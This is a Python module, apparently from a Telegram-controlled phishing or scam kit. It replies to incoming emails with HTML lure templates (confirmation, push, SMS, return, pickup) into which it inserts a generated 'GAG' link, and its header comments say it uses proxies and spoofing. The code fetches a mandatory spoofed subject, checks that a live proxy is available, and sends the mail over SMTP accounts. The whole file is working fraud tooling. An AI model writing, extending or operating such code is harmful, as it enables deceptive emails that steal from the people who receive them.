"""Отправка HTML-ответа на входящее письмо (GAG-ссылка + прокси + спуфинг)."""

from __future__ import annotations

import re
from dataclasses import dataclass

from config import Settings
from database import get_incoming_mail, get_smtp_account
from services.gag_keys import GAG_SERVICE_KEY, is_valid_gag_service
from services.html_reply import build_incoming_html_ctx
from services.html_spoof import HtmlOutboundError, get_mandatory_spoof_subject
from services.html_templates import load_html_template_for_user
from services.mail_outbound import NoLiveProxyError, send_mail
from services.placeholders import apply_placeholders
from services.user_settings import get_setting

HTML_KIND_FILES = {
    "go": "confirmation.html",
    "pro": "confirmation.html",
    "push": "push.html",
    "sms": "sms.html",
    "back": "return.html",
    "pickup": "pickup.html",
}


@dataclass
class IncomingHtmlSendResult:
    ok: bool
    error: str | None = None
    html_body: str = ""
    subject: str = ""
    to_email: str = ""
    account_email: str = ""
    account_id: int = 0


def _apply_link(html_text: str, link: str) -> str:
    if not html_text or not link:
        return html_text
    return re.sub(r"\{\{\s*LINK\s*\}\}", link, html_text, flags=re.I)


async def build_incoming_html_body(
    user_id: int,
    *,
    mail_id: int,
    kind: str,
) -> tuple[str | None, str | None, IncomingHtmlSendResult]:
    """
  Returns (html_body, error, partial result with meta for notify).
    """
    mail = await get_incoming_mail(mail_id, user_id)
    if not mail:
        return None, "Письмо не найдено", IncomingHtmlSendResult(ok=False, error="Письмо не найдено")

    gag_link = (mail.get("generated_link") or "").strip()
    if not gag_link:
        return (
            None,
            "Сначала нажмите «🔗 Создать ссылку» для этого письма.",
            IncomingHtmlSendResult(
                ok=False,
                error="Сначала нажмите «🔗 Создать ссылку» для этого письма.",
            ),
        )

    filename = HTML_KIND_FILES.get((kind or "").strip().lower())
    if not filename:
        return None, "Неизвестный шаблон HTML", IncomingHtmlSendResult(
            ok=False, error="Неизвестный шаблон HTML"
        )

    raw_svc = (await get_setting(user_id, GAG_SERVICE_KEY) or "").strip()
    if not is_valid_gag_service(raw_svc):
        return None, "Выберите сервис в 👤 Профиль → 🧭 Выбор сервиса", IncomingHtmlSendResult(
            ok=False, error="Выберите сервис в 👤 Профиль → 🧭 Выбор сервиса"
        )

    raw_html, err = await load_html_template_for_user(user_id, filename)
    if err or not raw_html:
        return None, err or "HTML-шаблон не найден", IncomingHtmlSendResult(
            ok=False, error=err or "HTML-шаблон не найден"
        )

    to_email = (mail.get("from_email") or "").strip()
    if "@" not in to_email:
        return None, "Нет email получателя", IncomingHtmlSendResult(
            ok=False, error="Нет email получателя"
        )

    ctx = await build_incoming_html_ctx(user_id, mail, gag_link=gag_link)
    html_body = _apply_link(raw_html, gag_link)
    html_body = apply_placeholders(html_body, link=gag_link, ctx=ctx)

    sig = (await get_setting(user_id, "html_signature") or "").strip()
    if sig:
        html_body = html_body.replace("{{SIGNATURE}}", sig)

    try:
        subject = await get_mandatory_spoof_subject(user_id)
    except HtmlOutboundError as exc:
        return None, str(exc), IncomingHtmlSendResult(ok=False, error=str(exc))

    account_email = (mail.get("account_email") or "").strip()
    return (
        html_body,
        None,
        IncomingHtmlSendResult(
            ok=True,
            html_body=html_body,
            subject=subject,
            to_email=to_email,
            account_email=account_email,
            account_id=int(mail.get("account_id") or 0),
        ),
    )


async def send_incoming_html(
    settings: Settings,
    user_id: int,
    *,
    mail_id: int,
    kind: str,
) -> IncomingHtmlSendResult:
    """Собрать HTML, отправить SMTP, вернуть тело для вложения в Telegram."""
    html_body, err, meta = await build_incoming_html_body(
        user_id, mail_id=mail_id, kind=kind
    )
    if err or not html_body:
        return meta

    account = await get_smtp_account(meta.account_id, user_id)
    if not account:
        return IncomingHtmlSendResult(ok=False, error="SMTP-аккаунт не найден")

    try:
        await send_mail(
            settings,
            user_id,
            to_addr=meta.to_email,
            subject=meta.subject,
            body=html_body,
            is_html=True,
            account=account,
        )
    except HtmlOutboundError as exc:
        return IncomingHtmlSendResult(ok=False, error=str(exc))
    except NoLiveProxyError as exc:
        return IncomingHtmlSendResult(ok=False, error=str(exc))
    except Exception as exc:
        return IncomingHtmlSendResult(ok=False, error=str(exc)[:400])

    meta.ok = True
    return meta
